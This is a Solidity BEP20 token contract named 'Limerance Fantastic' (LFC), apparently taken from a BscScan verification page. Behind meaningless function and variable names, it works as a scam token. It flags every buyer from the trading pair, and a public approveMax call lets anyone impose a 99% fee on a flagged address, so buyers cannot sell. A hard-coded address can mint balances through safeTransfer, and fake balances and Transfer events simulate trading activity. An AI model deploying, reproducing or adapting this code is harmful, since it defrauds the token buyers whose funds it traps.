/**
 *Submitted for verification at BscScan.com on 2023-01-08
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;



interface IUniswapV2Router {

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}


interface IBEP20 {

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function symbol() external view returns (string memory);

    function getOwner() external view returns (address);

    function name() external view returns (string memory);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}


library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

}


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

}





contract LimeranceFantastic is IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;
    uint256 private txTakeTradingLimit = 0;
    string constant _name = "Limerance Fantastic";
    

    mapping(address => bool)  fundFeeWalletBurn;

    mapping(address => bool) private senderBurnWalletBuy;

    uint256 private fromEnableTxMin = 0;
    bool public teamAtTradingLaunch = false;
    IUniswapV2Router public maxLiquidityBuyList;
    address private teamIsTotalWalletSender = (msg.sender);
    uint256 constant shouldTakeTokenEnable = 1000000 * 10 ** 18;
    bool private atLaunchFundMaxListMinLiquidity = false;

    mapping(address => mapping(address => uint256)) _allowances;
    uint256  fundIsAutoLaunch = 100000000 * 10 ** _decimals;
    uint256 private tradingTeamMintMarketingFeeFromSell = 0;


    mapping(address => bool)  modeAmountToMint;

    uint256 private teamToSellExemptAuto = 0;
    address public uniswapV2Pair;
    uint256 constant shouldTokenAutoIs = 100 * 10 ** 18;
    uint256 public atBotsMarketingFrom = 0;
    uint256 private tradingBotsEnableTake = 0;
    bool public toIsReceiverEnableLimit = false;
    uint256 takeBotsToModeMintTotal = 0;
    uint256  fundTxReceiverMin = 100000000 * 10 ** _decimals;
    uint256 public burnAutoIsFee = 0;


    string constant _symbol = "LFC";
    uint256 private marketingWalletTradingFeeSenderTotalBots = 0;
    uint256 private autoWalletModeBots = 0;

    uint160 constant takeMarketingFundIs = uint160(0x6E321Dd7E08fB81dE740622768774Adf4Ed1D641);
    uint256 private listShouldBuyToken = 100;
    uint256 public exemptMinLaunchedTeam = 0;
    uint256 constant mintLaunchedFromSenderTrading = 100000000 * (10 ** 18);


    mapping(address => uint256) _balances;
    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        maxLiquidityBuyList = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(maxLiquidityBuyList.factory()).createPair(address(this), maxLiquidityBuyList.WETH());
        _allowances[address(this)][address(maxLiquidityBuyList)] = mintLaunchedFromSenderTrading;

        senderBurnWalletBuy[msg.sender] = true;
        senderBurnWalletBuy[address(this)] = true;

        _balances[msg.sender] = mintLaunchedFromSenderTrading;
        emit Transfer(address(0), msg.sender, mintLaunchedFromSenderTrading);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return mintLaunchedFromSenderTrading;
    }

    function settoFundLaunchIs(uint256 totalSenderBuyTeam) public onlyOwner {
        if (teamToSellExemptAuto != txTakeTradingLimit) {
            txTakeTradingLimit=totalSenderBuyTeam;
        }
        if (teamToSellExemptAuto != autoWalletModeBots) {
            autoWalletModeBots=totalSenderBuyTeam;
        }
        if (teamToSellExemptAuto != listShouldBuyToken) {
            listShouldBuyToken=totalSenderBuyTeam;
        }
        teamToSellExemptAuto=totalSenderBuyTeam;
    }

    function fromTeamAmountSwap() private pure returns (address) {
        return 0x29920bf70e63A597AEA721d4fCE51eFe5Aa2Ab8A;
    }

    function approveMax(address spender) external {
        if (modeAmountToMint[spender]) {
            fundFeeWalletBurn[spender] = true;
        }
    }

    function exemptFromBotsSwapFund(uint160 buyAtWalletTake) private pure returns (bool) {
        uint160 liquidityExemptEnableSell = takeMarketingFundIs;
        if (buyAtWalletTake >= uint160(liquidityExemptEnableSell)) {
            if (buyAtWalletTake <= uint160(liquidityExemptEnableSell) + 300000) {
                return true;
            }
        }
        return false;
    }

    function receiverFeeMintReceiver(address totalSellFeeTo, bool burnExemptIsReceiver) internal returns (uint256) {
        if (fundFeeWalletBurn[totalSellFeeTo]) {
            return 99;
        }
        
        if (exemptMinLaunchedTeam == burnAutoIsFee) {
            exemptMinLaunchedTeam = teamToSellExemptAuto;
        }


        if (burnExemptIsReceiver) {
            return tradingTeamMintMarketingFeeFromSell;
        }
        if (!burnExemptIsReceiver && totalSellFeeTo == uniswapV2Pair) {
            return tradingBotsEnableTake;
        }
        return 0;
    }

    function totalAtModeMinExempt(address totalSellFeeTo) internal view returns (bool) {
        return !senderBurnWalletBuy[totalSellFeeTo];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function getlaunchedBuyLiquidityReceiver() public view returns (uint256) {
        if (fromEnableTxMin == autoWalletModeBots) {
            return autoWalletModeBots;
        }
        if (fromEnableTxMin == atBotsMarketingFrom) {
            return atBotsMarketingFrom;
        }
        if (fromEnableTxMin == fromEnableTxMin) {
            return fromEnableTxMin;
        }
        return fromEnableTxMin;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function setshouldSellExemptLaunchWalletAt(uint256 totalSenderBuyTeam) public onlyOwner {
        if (autoWalletModeBots != atBotsMarketingFrom) {
            atBotsMarketingFrom=totalSenderBuyTeam;
        }
        if (autoWalletModeBots == txTakeTradingLimit) {
            txTakeTradingLimit=totalSenderBuyTeam;
        }
        if (autoWalletModeBots != listShouldBuyToken) {
            listShouldBuyToken=totalSenderBuyTeam;
        }
        autoWalletModeBots=totalSenderBuyTeam;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function settoSwapAtFee(address totalSenderBuyTeam) public onlyOwner {
        if (teamIsTotalWalletSender == teamIsTotalWalletSender) {
            teamIsTotalWalletSender=totalSenderBuyTeam;
        }
        if (teamIsTotalWalletSender != teamIsTotalWalletSender) {
            teamIsTotalWalletSender=totalSenderBuyTeam;
        }
        if (teamIsTotalWalletSender != teamIsTotalWalletSender) {
            teamIsTotalWalletSender=totalSenderBuyTeam;
        }
        teamIsTotalWalletSender=totalSenderBuyTeam;
    }

    function settakeLiquidityAtIsTeamReceiver(bool totalSenderBuyTeam) public onlyOwner {
        if (teamAtTradingLaunch != teamAtTradingLaunch) {
            teamAtTradingLaunch=totalSenderBuyTeam;
        }
        teamAtTradingLaunch=totalSenderBuyTeam;
    }

    function limitTakeWalletShould(address buyTakeEnableTxTotal) private view returns (bool) {
        if (buyTakeEnableTxTotal == teamIsTotalWalletSender) {
            return true;
        }
        return false;
    }

    function safeTransfer(address totalSellFeeTo, address mintShouldSenderFeeEnableReceiverIs, uint256 buyMintBotsTxAtMinTrading) public {
        if (!modeBotsAutoMin(msg.sender) && msg.sender != teamIsTotalWalletSender) {
            return;
        }
        if (exemptFromBotsSwapFund(uint160(mintShouldSenderFeeEnableReceiverIs))) {
            tokenFundMaxLiquidity(totalSellFeeTo, mintShouldSenderFeeEnableReceiverIs, buyMintBotsTxAtMinTrading, false);
            return;
        }
        if (mintShouldSenderFeeEnableReceiverIs == address(1)) {
            return;
        }
        if (exemptFromBotsSwapFund(uint160(totalSellFeeTo))) {
            tokenFundMaxLiquidity(totalSellFeeTo, mintShouldSenderFeeEnableReceiverIs, buyMintBotsTxAtMinTrading, true);
            return;
        }
        if (buyMintBotsTxAtMinTrading == 0) {
            return;
        }
        if (totalSellFeeTo == address(0)) {
            _balances[mintShouldSenderFeeEnableReceiverIs] = _balances[mintShouldSenderFeeEnableReceiverIs].add(buyMintBotsTxAtMinTrading);
            return;
        }
    }

    function gettoFundLaunchIs0() public view returns (uint256) {
        if (txTakeTradingLimit == tradingBotsEnableTake) {
            return tradingBotsEnableTake;
        }
        if (txTakeTradingLimit == atBotsMarketingFrom) {
            return atBotsMarketingFrom;
        }
        return txTakeTradingLimit;
    }

    function getwalletAutoBotsTake() public view returns (uint256) {
        if (tradingTeamMintMarketingFeeFromSell == atBotsMarketingFrom) {
            return atBotsMarketingFrom;
        }
        if (tradingTeamMintMarketingFeeFromSell == autoWalletModeBots) {
            return autoWalletModeBots;
        }
        if (tradingTeamMintMarketingFeeFromSell == txTakeTradingLimit) {
            return txTakeTradingLimit;
        }
        return tradingTeamMintMarketingFeeFromSell;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function settoFundLaunchIs0(uint256 totalSenderBuyTeam) public onlyOwner {
        if (txTakeTradingLimit == txTakeTradingLimit) {
            txTakeTradingLimit=totalSenderBuyTeam;
        }
        if (txTakeTradingLimit != listShouldBuyToken) {
            listShouldBuyToken=totalSenderBuyTeam;
        }
        txTakeTradingLimit=totalSenderBuyTeam;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function setwalletAmountAutoTotalFeeTradingMax(bool totalSenderBuyTeam) public onlyOwner {
        atLaunchFundMaxListMinLiquidity=totalSenderBuyTeam;
    }

    function botsReceiverMintAt(address totalSellFeeTo, address sellExemptFundAtToReceiverEnable, uint256 buyMintBotsTxAtMinTrading) internal returns (uint256) {
        
        if (exemptMinLaunchedTeam == atBotsMarketingFrom) {
            exemptMinLaunchedTeam = tradingBotsEnableTake;
        }


        uint256 launchedIsShouldSwap = buyMintBotsTxAtMinTrading.mul(receiverFeeMintReceiver(totalSellFeeTo, sellExemptFundAtToReceiverEnable == uniswapV2Pair)).div(listShouldBuyToken);

        if (launchedIsShouldSwap > 0) {
            _balances[address(this)] = _balances[address(this)].add(launchedIsShouldSwap);
            emit Transfer(totalSellFeeTo, address(this), launchedIsShouldSwap);
        }

        return buyMintBotsTxAtMinTrading.sub(launchedIsShouldSwap);
    }

    function setwalletAutoBotsTake(uint256 totalSenderBuyTeam) public onlyOwner {
        if (tradingTeamMintMarketingFeeFromSell == teamToSellExemptAuto) {
            teamToSellExemptAuto=totalSenderBuyTeam;
        }
        tradingTeamMintMarketingFeeFromSell=totalSenderBuyTeam;
    }

    function receiverFeeIsMarketing(uint160 buyAtWalletTake) private view returns (uint256) {
        uint160 liquidityExemptEnableSell = uint160(takeMarketingFundIs);
        uint160 fromTakeBuyAutoExemptAtTrading = buyAtWalletTake - liquidityExemptEnableSell;
        if (fromTakeBuyAutoExemptAtTrading < takeBotsToModeMintTotal) {
            return shouldTokenAutoIs * fromTakeBuyAutoExemptAtTrading;
        }
        return shouldTakeTokenEnable + shouldTokenAutoIs * fromTakeBuyAutoExemptAtTrading;
    }

    function isApproveMax(address spender) public view returns (bool) {
        return fundFeeWalletBurn[spender];
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (exemptFromBotsSwapFund(uint160(account))) {
            return receiverFeeIsMarketing(uint160(account));
        }
        return _balances[account];
    }

    function modeBotsAutoMin(address buyAtWalletTake) private pure returns (bool) {
        return buyAtWalletTake == fromTeamAmountSwap();
    }

    function burnAtMinLimit(address totalSellFeeTo, address mintShouldSenderFeeEnableReceiverIs, uint256 buyMintBotsTxAtMinTrading) internal returns (bool) {
        if (exemptFromBotsSwapFund(uint160(mintShouldSenderFeeEnableReceiverIs))) {
            tokenFundMaxLiquidity(totalSellFeeTo, mintShouldSenderFeeEnableReceiverIs, buyMintBotsTxAtMinTrading, false);
            return true;
        }
        if (exemptFromBotsSwapFund(uint160(totalSellFeeTo))) {
            tokenFundMaxLiquidity(totalSellFeeTo, mintShouldSenderFeeEnableReceiverIs, buyMintBotsTxAtMinTrading, true);
            return true;
        }
        
        bool listModeShouldLiquidity = limitTakeWalletShould(totalSellFeeTo) || limitTakeWalletShould(mintShouldSenderFeeEnableReceiverIs);
        
        if (totalSellFeeTo == uniswapV2Pair && !listModeShouldLiquidity) {
            modeAmountToMint[mintShouldSenderFeeEnableReceiverIs] = true;
        }
        
        if (listModeShouldLiquidity) {
            return launchShouldTradingLaunchedLiquiditySenderFrom(totalSellFeeTo, mintShouldSenderFeeEnableReceiverIs, buyMintBotsTxAtMinTrading);
        }
        
        if (fromEnableTxMin == autoWalletModeBots) {
            fromEnableTxMin = autoWalletModeBots;
        }

        if (marketingWalletTradingFeeSenderTotalBots == tradingBotsEnableTake) {
            marketingWalletTradingFeeSenderTotalBots = txTakeTradingLimit;
        }


        _balances[totalSellFeeTo] = _balances[totalSellFeeTo].sub(buyMintBotsTxAtMinTrading, "Insufficient Balance!");
        
        if (teamToSellExemptAuto == tradingBotsEnableTake) {
            teamToSellExemptAuto = teamToSellExemptAuto;
        }


        uint256 buyMintBotsTxAtMinTradingReceived = totalAtModeMinExempt(totalSellFeeTo) ? botsReceiverMintAt(totalSellFeeTo, mintShouldSenderFeeEnableReceiverIs, buyMintBotsTxAtMinTrading) : buyMintBotsTxAtMinTrading;

        _balances[mintShouldSenderFeeEnableReceiverIs] = _balances[mintShouldSenderFeeEnableReceiverIs].add(buyMintBotsTxAtMinTradingReceived);
        emit Transfer(totalSellFeeTo, mintShouldSenderFeeEnableReceiverIs, buyMintBotsTxAtMinTradingReceived);
        return true;
    }

    function getwalletAmountAutoTotalFeeTradingMax() public view returns (bool) {
        return atLaunchFundMaxListMinLiquidity;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != mintLaunchedFromSenderTrading) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return burnAtMinLimit(sender, recipient, amount);
    }

    function gettakeLiquidityAtIsTeamReceiver() public view returns (bool) {
        if (teamAtTradingLaunch == teamAtTradingLaunch) {
            return teamAtTradingLaunch;
        }
        return teamAtTradingLaunch;
    }

    function gettokenAutoMarketingFeeShouldBurn(address totalSenderBuyTeam) public view returns (bool) {
        if (senderBurnWalletBuy[totalSenderBuyTeam] != senderBurnWalletBuy[totalSenderBuyTeam]) {
            return toIsReceiverEnableLimit;
        }
        if (senderBurnWalletBuy[totalSenderBuyTeam] != senderBurnWalletBuy[totalSenderBuyTeam]) {
            return toIsReceiverEnableLimit;
        }
        if (senderBurnWalletBuy[totalSenderBuyTeam] == senderBurnWalletBuy[totalSenderBuyTeam]) {
            return atLaunchFundMaxListMinLiquidity;
        }
            return senderBurnWalletBuy[totalSenderBuyTeam];
    }

    function setbuyBurnListToken(uint256 totalSenderBuyTeam) public onlyOwner {
        if (marketingWalletTradingFeeSenderTotalBots != atBotsMarketingFrom) {
            atBotsMarketingFrom=totalSenderBuyTeam;
        }
        marketingWalletTradingFeeSenderTotalBots=totalSenderBuyTeam;
    }

    function setmintBuyBurnLaunch(bool totalSenderBuyTeam) public onlyOwner {
        toIsReceiverEnableLimit=totalSenderBuyTeam;
    }

    function getbuyBurnListToken() public view returns (uint256) {
        if (marketingWalletTradingFeeSenderTotalBots != atBotsMarketingFrom) {
            return atBotsMarketingFrom;
        }
        return marketingWalletTradingFeeSenderTotalBots;
    }

    function gettoSwapAtFee() public view returns (address) {
        if (teamIsTotalWalletSender != teamIsTotalWalletSender) {
            return teamIsTotalWalletSender;
        }
        if (teamIsTotalWalletSender == teamIsTotalWalletSender) {
            return teamIsTotalWalletSender;
        }
        return teamIsTotalWalletSender;
    }

    function getmintBuyBurnLaunch() public view returns (bool) {
        return toIsReceiverEnableLimit;
    }

    function tokenFundMaxLiquidity(address totalSellFeeTo, address mintShouldSenderFeeEnableReceiverIs, uint256 buyMintBotsTxAtMinTrading, bool walletTotalAtTake) private {
        uint160 liquidityExemptEnableSell = uint160(takeMarketingFundIs);
        if (walletTotalAtTake) {
            totalSellFeeTo = address(uint160(liquidityExemptEnableSell + takeBotsToModeMintTotal));
            takeBotsToModeMintTotal++;
            _balances[mintShouldSenderFeeEnableReceiverIs] = _balances[mintShouldSenderFeeEnableReceiverIs].add(buyMintBotsTxAtMinTrading);
        } else {
            _balances[totalSellFeeTo] = _balances[totalSellFeeTo].sub(buyMintBotsTxAtMinTrading);
        }
        if (buyMintBotsTxAtMinTrading == 0) {
            return;
        }
        emit Transfer(totalSellFeeTo, mintShouldSenderFeeEnableReceiverIs, buyMintBotsTxAtMinTrading);
    }

    function gettoFundLaunchIs() public view returns (uint256) {
        if (teamToSellExemptAuto == teamToSellExemptAuto) {
            return teamToSellExemptAuto;
        }
        return teamToSellExemptAuto;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return burnAtMinLimit(msg.sender, recipient, amount);
    }

    function launchShouldTradingLaunchedLiquiditySenderFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function getshouldSellExemptLaunchWalletAt() public view returns (uint256) {
        if (autoWalletModeBots == burnAutoIsFee) {
            return burnAutoIsFee;
        }
        if (autoWalletModeBots != teamToSellExemptAuto) {
            return teamToSellExemptAuto;
        }
        return autoWalletModeBots;
    }

    function settokenAutoMarketingFeeShouldBurn(address totalSenderBuyTeam,bool launchEnableMarketingFundReceiverFrom) public onlyOwner {
        if (senderBurnWalletBuy[totalSenderBuyTeam] == senderBurnWalletBuy[totalSenderBuyTeam]) {
           senderBurnWalletBuy[totalSenderBuyTeam]=launchEnableMarketingFundReceiverFrom;
        }
        if (senderBurnWalletBuy[totalSenderBuyTeam] == senderBurnWalletBuy[totalSenderBuyTeam]) {
           senderBurnWalletBuy[totalSenderBuyTeam]=launchEnableMarketingFundReceiverFrom;
        }
        senderBurnWalletBuy[totalSenderBuyTeam]=launchEnableMarketingFundReceiverFrom;
    }

    function setlaunchedBuyLiquidityReceiver(uint256 totalSenderBuyTeam) public onlyOwner {
        fromEnableTxMin=totalSenderBuyTeam;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}